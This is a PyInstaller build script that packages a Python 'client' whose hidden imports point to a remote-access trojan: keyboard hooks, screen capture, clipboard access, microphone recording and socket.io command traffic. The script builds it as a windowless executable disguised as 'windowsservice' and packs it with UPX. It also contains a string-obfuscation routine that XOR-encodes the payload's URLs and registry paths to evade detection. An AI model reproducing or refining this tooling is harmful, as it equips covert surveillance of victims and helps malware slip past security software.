# -*- mode: python ; coding: utf-8 -*-
import sys, os, base64, random, string

block_cipher = None

a = Analysis(
    ['client.py'],
    pathex=[],
    binaries=[],
    datas=[('modules.py', '.')],
    hiddenimports=[
        'socketio', 'engineio', 'engineio.async_drivers.threading',
        'mss', 'PIL', 'PIL._tkinter_finder',
        'pynput', 'pynput.keyboard', 'pynput.keyboard._win32',
        'pyautogui', 'psutil', 'win32gui', 'win32api', 'win32con',
        'win32process', 'win32security', 'win32event',
        'win32clipboard', 'win32console',
        'sounddevice', 'pyaudio',
        'Crypto', 'Crypto.Cipher', 'Crypto.Protocol', 'Crypto.Hash',
        'requests', 'wmi', 'dns', 'dns.resolver',
        'scipy', 'scipy.io.wavfile',
        'ctypes', 'json', 'base64', 'sqlite3', 'zipfile',
        'http', 'http.server', 'socketserver',
        'xml', 'xml.etree', 'xml.etree.ElementTree',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'tkinter', 'tkinter.ttk', 'unittest',
        'matplotlib', 'numpy', 'pandas', 'scipy.spatial',
        'IPython', 'jedi', 'parso',
        'test', 'lib2to3',
        'email', 'html', 'http.cookiejar',
        'asyncio', 'concurrent',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='windowsservice',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
)

# Also generate the obfuscated version
import re

def obfuscate_payload(source_path, output_path):
    with open(source_path, 'r', encoding='utf-8') as f:
        source = f.read()

    key = base64.b64encode(os.urandom(16)).decode()
    strings_to_encrypt = re.findall(r'["\']((?:https?://|\\\\|C:\\\\|HKCU|HKLM|Software\\\\)[^"\']{10,})["\']', source)

    for s in set(strings_to_encrypt):
        if len(s) < 8:
            continue
        enc = base64.b64encode(bytes(s.encode()[i] ^ ord(key[i % len(key)]) for i in range(len(s)))).decode()
        source = source.replace(f'"{s}"', f'__d("{enc}")')
        source = source.replace(f"'{s}'", f'__d("{enc}")')

    header = f'''import base64 as _b
_o = "{key}"
def __d(s):
    d = _b.b64decode(s)
    return bytes(d[i] ^ ord(_o[i % len(_o)]) for i in range(len(d))).decode()
'''
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(header + '\n' + source)

obfuscate_payload('client.py', 'client_obf.py')
obfuscate_payload('modules.py', 'modules_obf.py')
